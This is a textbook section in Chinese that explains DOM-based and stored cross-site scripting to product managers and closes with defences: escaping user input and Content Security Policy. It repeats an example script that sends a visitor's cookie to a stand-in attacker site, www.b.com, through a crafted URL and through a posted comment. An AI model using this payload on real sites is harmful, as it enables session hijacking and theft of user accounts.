---
author: 陈宇、巩晓波、高杨、杨俊勇、关磊
book: 给产品经理讲技术
description: XSS 指攻击者向正常网页注入恶意脚本，本文区分基于 DOM 与存储型两类 XSS，演示脚本如何窃取用户 Cookie，并说明转义与内容安全策略的防范方式
publication_date: '2019-04-01'
publisher: 电子工业出版社
title: 5.4 Web 安全之 XSS
---

<div class="book-original" markdown="1">

## Web 安全之 XSS

XSS（Cross Site Script）攻击的全称为“跨站脚本攻击”，指的是攻击者在正常网页中注入恶意脚本，当用户访问该网页时，恶意脚本会在用户浏览器上执行，从而窃取用户 Cookie 或者导航到恶意网站等，达到攻击的目的。

从上面的描述可以看出，XSS 攻击成功的关键在于向正常网页中注入恶意脚本。根据其注入脚本的方式，可以把 XSS 分为 DOM-Based XSS 和 Stored XSS 两类。

### DOM-Based XSS（基于 DOM 的 XSS）

网站 www.example.com 会将 URL 中的某个参数直接展示在页面上，如果访问 http://www.example.com/index.html?param=guoguo，网页就会显示“A guest Comes：guoguo”。我们可以猜测这个网页的后台大概如此：

```html
<html>
A guest Comes：<% Request.QueryString("param") %>
</html>
```

如果 param 的值不是一个普通的字符串而是一段恶意脚本，那我们看到页面应该是怎样的呢？拼接这样的一个网址：`http://www.example.com/index.html?param=<script>window.open("http://www.b.com?Cookie="+document.Cookie)</script>`，用户访问这个 URL 时，服务器将 param 的值输出到网页中，于是网页变成了：

```html
<html>
A guest Comes：<script>window.open("http://www.b.com?Cookie="+document.Cookie)</script>
</html>
```

浏览器端发现网页中有 `<script>` 标签，便老老实实地执行了恶意脚本：

```html
<script>window.open("http://www.b.com?Cookie="+document.Cookie)</script>
```

这段恶意脚本会将当前用户的 Cookie 发送到攻击者指定的网站 www.b.com，从而达到窃取当前用户 Cookie 的目的。

基于浏览器的安全策略，不同网站之间的 Cookie 是不能共享的，因此网站开发者会将一些用户信息（比如账户的名称与登录的令牌）缓存在 Cookie 中，使用户不至于每次访问都要登录账号。这种做法同时也留下一个隐患：如果用户 Cookie 被窃取了，那么攻击者就会将其模拟成真实用户，窃取该用户在网站上的敏感信息。

### Stored XSS（存储型 XSS）

存储型 XSS 常见于存储用户数据的网站，这些网站会接受用户提交数据（如发表的评论），然后将这些数据存储进数据库，当用户再次访问时，将其输出在页面中。如果攻击者提交的评论信息里含有恶意脚本，任何看到这条评论的用户都会自动执行这段恶意脚本，从而达到攻击的目的。

比如用户在某篇热门文章下评论“好文章，赞赞赞”，其他用户看到的也是“好文章，赞赞赞”；如果评论“`好文章，赞赞赞<script>window.open("http://www.b.com?Cookie="+document.Cookie)</script>`”，那么其他用户看到的内容不变，但同时执行了这段恶意脚本：

```html
<script>window.open("http://www.b.com?Cookie="+document.Cookie)</script>
```

相当于其他用户默默地将他们的 Cookie 发送给了网站 www.b.com。

总的来说，基于 DOM 的 XSS 攻击需要四处散播一个特殊的 URL，同时还要引诱用户打开它，这种攻击的效率较低。而存储型的 XSS 杀人于无形，一旦将恶意代码植入页面，所有访问该页面的用户都会受到攻击的影响。

XSS 攻击出现的根源是网站的开发者过于信任用户提交的数据，没有对用户的输入进行合法性校验和转换。因此，防范 XSS 攻击的主要方法就是检测用户提交的数据中是否有可执行的脚本，将其中的 HTML 标签都转换为普通的文本。在此之后，还可以启用浏览器的内容安全策略（Content Security Policy），使用白名单机制管理本网站允许加载的内容，同时禁止向未知的网站发送请求。

</div>
